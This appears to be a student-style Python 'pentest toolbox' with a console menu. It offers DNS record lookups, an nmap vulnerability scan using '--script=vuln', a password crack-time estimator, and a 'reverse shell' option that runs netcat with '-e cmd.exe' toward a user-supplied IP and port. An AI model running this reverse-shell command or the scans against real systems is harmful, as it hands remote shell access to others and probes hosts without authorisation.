# Welcome to The Generoso SDV-toolbox

# Librairies
import socket
import subprocess
import dns.resolver
import time
import re
import threading
import sys
import datetime

# Auto-reporting into the logs.txt
class DualWriter:
    def __init__(self, *writers):
        self.writers = writers

    def write(self, text):
        for w in self.writers:
            w.write(text)

    def flush(self):
        for w in self.writers:
            w.flush()

def log_to_file(function):
    def wrapper(*args, **kwargs):
        original_stdout = sys.stdout
        with open('logs.txt', 'a', encoding='utf-8') as f:
            # Write date & time before execution
            timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            f.write(f'\n[{timestamp}] Execution of {function.__name__}\n')
            # Double write in prompt & in the log file
            sys.stdout = DualWriter(f, original_stdout)
            result = function(*args, **kwargs)
        sys.stdout = original_stdout
        return result
    return wrapper

# The menu
# Displaying the menu structure
def afficher_menu():
    print("\n╔══════════════════════════════════════╗")
    print("║       The Generoso SDV-toolbox       ║")
    print("║                                      ║")
    print("║               Main menu              ║")
    print("╠══════════════════════════════════════╣")
    print("║ Functions :                          ║")
    print("║  1. Domain check-up                  ║")
    print("║  2. Vulnerability scan               ║")
    print("║  3. Reverse shell                    ║")
    print("║                                      ║")
    print("║ Extra :                              ║")
    print("║  4. Password analyzer                ║")
    print("╠══════════════════════════════════════╣")
    print("║  0. Exit                             ║")
    print("╚══════════════════════════════════════╝")

# Function to execute the menu
def executer_menu():
    while True:
        afficher_menu()
        choix = input("Please enter your choice: ")
        if choix == "1":
            domain_check()
        elif choix == "2":
            vuln_scan()
        elif choix == "3":
            reverse_shell()
        elif choix == "4":
            password_analyzer()
        elif choix == "0":
            print("\n════════════════════════════════════════")
            print("Exiting...")
            time.sleep(3) 
            break
        else:
            print("Invalid choice. Please enter a number between 0 and 4: ")

# Functions list
# Function 1 - Domain check-up with DNSPython
@log_to_file
def domain_check():
    print("\n╔════════════════════════════╗")
    print("║ Option 1 : Domain check-up ║")
    print("╚════════════════════════════╝")
    target = input("Please enter a domain name: ")
    resolver = dns.resolver.Resolver()
    resolver.timeout = 10
    resolver.lifetime = 10
    resolver.nameservers = ['8.8.8.8']

    try:
        # Displaying IP Address from the domain
        ip_address = socket.gethostbyname(target)
        print("\n════════════════════════════════════════")
        print(f"The IP address of {target} is {ip_address}")

        # DNS resolution 
        ns_records = resolver.resolve(target, 'NS')
        print("- DNS: ")
        for ns in ns_records:
            print(ns.target)

        mx_records = resolver.resolve(target, 'MX')
        print("- MX records: ")
        for mx in mx_records:
            print(f'{mx.exchange} has a priority of {mx.preference}')

        txt_records = resolver.resolve(target, 'TXT')
        print("- TXT records: ")
        for txt in txt_records:
            print(txt.strings)
        print("════════════════════════════════════════")

    except socket.gaierror as e:
        print(f"Error when searching for domain name {target}: {e} ")
    except dns.resolver.NoAnswer as e:
        print(f"No nameservers available for {target}: {e} ")
    except Exception as e:
        print(f"An error has occurred: {e} ")

# Function 2 - Vulnerability scan (ports and services scan with Nmap adding NSE)
@log_to_file
def vuln_scan():
    print("\n╔═══════════════════════════════╗")
    print("║ Option 2 : Vulnerability scan ║")
    print("╚═══════════════════════════════╝")
    print("Please enter an IP address or a domain to scan: ")
    cible = input("-> ")
    attaque = input("Enter the attack level from 0 to 5 (default 3): ")
    if not attaque:
        attaque = "3"
    debut_port = input("Enter the first port to scan (default 1): ")
    if not debut_port:
        debut_port = "1"
    fin_port = input("Enter the last port to scan (default 1000): ")
    if not fin_port:
        fin_port = "1000"
   
    # Nmap command
    print("Starting a vulnerability scan...")
    commande_nmap = ["nmap", "-Pn", f"-T{attaque}", f"-p{debut_port}-{fin_port}", "-sV", "--script=vuln", cible]
    try:
        resultat = subprocess.run(commande_nmap, capture_output=True, text=True, check=True)
        print("\n════════════════════════════════════════")
        print(resultat.stdout)
        print("════════════════════════════════════════")
    except subprocess.CalledProcessError as e:
        print("An error occurred: ", e)

# Function 3.1 - Reverse shell with Netcat (listening process)
def ecoute_netcat(port):
    chemin_netcat = r"C:\netcat-win32-1.12\nc.exe"
    commande_ecoute = f"{chemin_netcat} -lvp {port}"
    try:
        subprocess.run(commande_ecoute, shell=True)
    except subprocess.CalledProcessError as e:
        print("Error executing netcat command: ", e)

# Function 3.2 - Reverse shell with Netcat (connexion process)
@log_to_file
def reverse_shell():
    print("\n╔══════════════════════════╗")
    print("║ Option 3 : Reverse shell ║")
    print("╚══════════════════════════╝")
    print("Please enter the host IP: ")
    ip_cible = input("-> ")
    print("Please enter the listening port (default 4444): ")
    port = input("-> ")
    if not port:
        port = "4444"
   
    # Custom path
    chemin_netcat = r"C:\netcat-win32-1.12\nc.exe"  

    # Netcat execution
    commande_netcat = f"{chemin_netcat} -e cmd.exe {ip_cible} {port}"
    thread_ecoute = threading.Thread(target=ecoute_netcat, args=(port,))
    thread_ecoute.start()
    time.sleep(2)
    try:
        resultat = subprocess.run(commande_netcat, shell=True)
        print("\n════════════════════════════════════════")
        print(resultat)
        print("════════════════════════════════════════")
    except subprocess.CalledProcessError as e:
        print("Error executing netcat command: ", e)

# Extra: Password analyzer
@log_to_file
def password_analyzer():

    # Table that determines how long it takes for a password to be brute force according to a Hive Systems study
    crack_times = {
        (4, "numbers"): "Instantly", (5, "numbers"): "Instantly", (6, "numbers"): "Instantly", (7, "numbers"): "Instantly",
        (8, "numbers"): "Instantly", (9, "numbers"): "Instantly", (10, "numbers"): "Instantly", (11, "numbers"): "Instantly",
        (12, "numbers"): "2 secs", (13, "numbers"): "19 secs", (14, "numbers"): "3 mins", (15, "numbers"): "32 mins",
        (16, "numbers"): "5 hours", (17, "numbers"): "2 days", (18, "numbers"): "3 weeks",

        (4, "lower"): "Instantly", (5, "lower"): "Instantly", (6, "lower"): "Instantly", (7, "lower"): "Instantly",
        (8, "lower"): "Instantly", (9, "lower"): "10 secs", (10, "lower"): "4 mins", (11, "lower"): "2 hours",
        (12, "lower"): "2 days", (13, "lower"): "2 months", (14, "lower"): "4 years", (15, "lower"): "100 years",
        (16, "lower"): "3k years", (17, "lower"): "69k years", (18, "lower"): "2m years",

        (4, "upper_lower"): "Instantly", (5, "upper_lower"): "Instantly", (6, "upper_lower"): "Instantly",
        (7, "upper_lower"): "2 secs", (8, "upper_lower"): "2 mins", (9, "upper_lower"): "1 hour",
        (10, "upper_lower"): "3 days", (11, "upper_lower"): "5 months", (12, "upper_lower"): "24 years",
        (13, "upper_lower"): "1k years", (14, "upper_lower"): "64k years", (15, "upper_lower"): "3m years",
        (16, "upper_lower"): "173m years", (17, "upper_lower"): "467bn years", (18, "upper_lower"): "111tn years",

        (4, "upper_lower_numbers"): "Instantly", (5, "upper_lower_numbers"): "Instantly", (6, "upper_lower_numbers"): "Instantly",
        (7, "upper_lower_numbers"): "7 secs", (8, "upper_lower_numbers"): "7 mins", (9, "upper_lower_numbers"): "7 hours",
        (10, "upper_lower_numbers"): "3 weeks", (11, "upper_lower_numbers"): "3 years", (12, "upper_lower_numbers"): "200 years",
        (13, "upper_lower_numbers"): "12k years", (14, "upper_lower_numbers"): "750k years", (15, "upper_lower_numbers"): "46m years",
        (16, "upper_lower_numbers"): "3bn years", (17, "upper_lower_numbers"): "179bn years", (18, "upper_lower_numbers"): "7tn years",

        (4, "all"): "Instantly", (5, "all"): "Instantly", (6, "all"): "Instantly", (7, "all"): "31 secs",
        (8, "all"): "39 mins", (9, "all"): "2 days", (10, "all"): "5 months", (11, "all"): "34 years",
        (12, "all"): "3k years", (13, "all"): "202k years", (14, "all"): "16m years", (15, "all"): "1bn years",
        (16, "all"): "92bn years", (17, "all"): "7tn years", (18, "all"): "438tn years",
    }

    print("\n╔═══════════════════════════╗")
    print("║ Extra : Password analyzer ║")
    print("╚═══════════════════════════╝")
    password = input("Please enter a password: ")

    # Detection process
    length = len(password)
    has_lower = bool(re.search(r'[a-z]', password))
    has_upper = bool(re.search(r'[A-Z]', password))
    has_digit = bool(re.search(r'\d', password))
    has_symbol = bool(re.search(r'\W', password))

    if has_lower and has_upper and has_digit and has_symbol:
        category = "all"
    elif has_lower and has_upper and has_digit:
        category = "upper_lower_numbers"
    elif has_lower and has_upper:
        category = "upper_lower"
    elif has_lower:
        category = "lower"
    else:
        category = "numbers"

    time_to_crack = crack_times.get((length, category), "Unknown lifetime")

    print("\n════════════════════════════════════════")
    print(f"It may be brute force by:{time_to_crack}")
    print("════════════════════════════════════════")

# Execution of the menu
if __name__ == "__main__":
    executer_menu()